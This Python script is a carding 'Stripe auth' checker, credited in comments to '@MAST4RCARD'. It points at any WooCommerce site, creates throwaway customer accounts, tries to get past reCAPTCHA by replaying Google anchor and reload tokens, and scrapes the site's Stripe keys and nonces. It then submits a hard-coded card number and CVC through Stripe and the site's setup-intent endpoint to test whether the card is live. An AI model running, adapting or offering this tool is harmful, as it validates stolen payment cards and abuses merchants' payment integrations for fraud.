import re
import json
import requests
import time
import uuid
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs
from requests_toolbelt.multipart.encoder import MultipartEncoder

r = requests.session()

site = input('Your Stripe Auth Site - Woocommerce: ').strip().rstrip('/')
if not site.startswith(('http://', 'https://')):
    site = 'https://' + site

url = site
url2 = f'{site}/my-account/'
url3 = f'{site}/my-account/payment-methods/'
url4 = f'{site}/my-account/add-payment-method/'
url5 = f'{site}/wp-admin/admin-ajax.php'
url6 = f'{site}/my-account/'

email = ''.join(random.choices(string.ascii_lowercase, k=6)) + "@gmail.com"
pas = ''.join(random.choices(string.ascii_letters + string.digits, k=10))

USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Redmi Note 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
]
UA = random.choice(USER_AGENTS)

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': UA,
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
def recaptcha_bypass(page_html: str, page_url: str) -> str | None:
    sitekey_match = re.search(r'data-sitekey=["\']([^"\']+)["\']', page_html, re.IGNORECASE)
    if not sitekey_match:
        print("❌ data-sitekey Nope")
        return None

    sitekey = sitekey_match.group(1)
    print(f"site Key Found: {sitekey}")
    origin_encoded = "aHR0cHM6Ly93d3cueW91cnNpdGUuY29t"
    anchor_url = (
        f"https://www.google.com/recaptcha/api2/anchor?"
        f"ar=1&k={sitekey}&co={origin_encoded}&hl=tr&v=...&size=invisible"
    )
    reload_url = f"https://www.google.com/recaptcha/api2/reload?k={sitekey}"

    print(f"anchor_url → {anchor_url}")
    print(f"reload_url  → {reload_url}")

    req_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    }

    try:
        resp_anchor = requests.get(anchor_url, headers=req_headers, timeout=12)
        resp_anchor.raise_for_status()

        token_match = re.search(r'value=["\']([^"\']+)["\']', resp_anchor.text)
        if not token_match:
            print("❌ Anchor token Not Found")
            print(resp_anchor.text[:600])
            return None

        token = token_match.group(1)

        parsed = urlparse(anchor_url)
        params = parse_qs(parsed.query)

        post_data = {
            'v': params.get('v', [''])[0],
            'reason': 'q',
            'c': token,
            'k': sitekey,
            'co': params.get('co', [''])[0],
            'hl': 'tr',
            'size': 'invisible'
        }

        post_headers = req_headers.copy()
        post_headers.update({
            "Referer": resp_anchor.url,
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": "https://www.google.com"
        })

        resp_reload = requests.post(reload_url, headers=post_headers, data=post_data, timeout=15)
        resp_reload.raise_for_status()

        rresp_match = re.search(r'\["rresp","([^"]+)"', resp_reload.text)
        if not rresp_match:
            print("❌ resp Token Nit Found")
            print(resp_reload.text[:800])
            return None

        g_token = rresp_match.group(1)
        print(f"Bypass Done → g-recaptcha-response: {g_token[:60]}...")
        return g_token

    except Exception as e:
        print(f"❌ Bypass Error {e}")
        return None
response = requests.get(url6, headers=headers, timeout=15)
if response.status_code != 200:
    print(f"Site Not Found!→ {response.status_code}")
    exit()

html = response.text
soup = BeautifulSoup(html, "html.parser")
nonce_tag = soup.find("input", {"name": "woocommerce-register-nonce"})
if nonce_tag and 'value' in nonce_tag.attrs:
    reg = nonce_tag['value']
    print(f"Reg Nonce: {reg}")
else:
    print("❌ Reg Nonce Not Found")
    print(html[:1500])
    exit()

def captcha_detected(text: str) -> bool:
    patterns = [
        r'captcha', r'recaptcha', r'g-recaptcha', r'hcaptcha',
        r'data-sitekey', r'cf-chl-captcha', r'cloudflare',
        r'are you human', r'verify you are human',
    ]
    text = text.lower()
    return any(re.search(p, text) for p in patterns)
headers_register = headers.copy()
headers_register.update({
    'Origin': url,
    'Referer': f'{url}/my-account/',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
})

data_register = {
    'email': email,
    'password': pas,
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': f'{url}/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2026-01-25 17:24:57',
    'wc_order_attribution_session_pages': '5',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': UA,
    'woocommerce-register-nonce': reg,
    '_wp_http_referer': '/my-account/',
    'register': 'Register', 
}
print(f"Register Test → {email}:{pas}")

response = r.post(f'{url}/my-account/', headers=headers_register, data=data_register, timeout=20)
html1 = response.text
if captcha_detected(html1):
    print("⚠️ Login CAPTCHA Required")
    
    g_token = recaptcha_bypass(html1, f'{url}/my-account/')
    
    if g_token:
        data_register['g-recaptcha-response'] = g_token
        response = r.post(f'{url}/my-account/', headers=headers_register, data=data_register, timeout=20)
        html1 = response.text
        
        if "registered" in html1.lower() or "dashboard" in html1.lower() or "welcome" in html1.lower():
            print("Register Done hcpatcha Work!")
        else:
            print("❌ Bypass Error")
            print(html1[:1500])
            exit()
    else:
        print("❌ CAPTCHA bypass Failed")
        exit()
headers_payment = headers.copy()
headers_payment.update({
    'Referer': f'{url}/my-account/payment-methods/',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
})

response = r.get(f'{url}/my-account/add-payment-method/', headers=headers_payment, timeout=15)
html = response.text

if captcha_detected(html):
    print("⚠️ Payment CAPTCHA Required")
    
    g_token = recaptcha_bypass(html, f'{url}/my-account/add-payment-method/')
    
    if g_token:
        print("Payment CAPTCHA bypass Done")
    else:
        print("❌ Paymeny CAPTCHA bypass Failed")
        exit()
pks_m = re.search(r'"publishableKey"\s*:\s*"([^"]+)"', html)
acct_m = re.search(r'"accountId"\s*:\s*"([^"]+)"', html)
nonce_m = re.search(r'"createSetupIntentNonce"\s*:\s*"([^"]+)"', html)

if not pks_m or not acct_m or not nonce_m:
    print("❌ Stripe Error")
    print("=" * 60)
    print(html[:3000])
    print("=" * 60)
    exit()

pks = pks_m.group(1)
acct = acct_m.group(1)
nonce = nonce_m.group(1)

print(f"pk: {pks}")
print(f"acct: {acct}")
print(f"nonce: {nonce}")
headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'pragma': 'no-cache',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}
data = f'billing_details[name]=+&billing_details[email]={email}&billing_details[address][country]=TR&type=card&card[number]=5218+0711+7515+6668&card[cvc]=574&card[exp_year]=26&card[exp_month]=02&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F065b474d33%3B+stripe-js-v3%2F065b474d33%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.warmisland.com&time_on_page=177849&client_attribution_metadata[client_session_id]=84ad350c-44b7-4e83-b48b-68bd7c69c34b&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=ca4f1bcd-5c07-4b15-90dd-119357fc2486&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=beb24868-9013-41ea-9964-7917dbbc35582418cf&muid=929c4143-a270-4912-bf4d-9d1ac8b9e044ed0431&sid=c9b88b93-0a69-4079-9183-2e06ee66b80198b2f1&key={pks}&_stripe_account={acct}'
response = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
id = response.json()['id']
print(id)
from requests_toolbelt.multipart.encoder import MultipartEncoder
data = MultipartEncoder({
    'action': (None, 'create_setup_intent'),
    'wcpay-payment-method': (None, id),
    '_ajax_nonce': (None, nonce),
})
headers = {
    'Accept': '*/*',
    'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-Type': data.content_type,
    'Origin': f'{url}',
    'Pragma': 'no-cache',
    'Referer': f'{url}/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
}
response = r.post(f'{url}/wp-admin/admin-ajax.php', headers=headers, data=data)
print(response.json())
#CODE BY @MAST4RCARD
#COURSE : @FTX_COURSE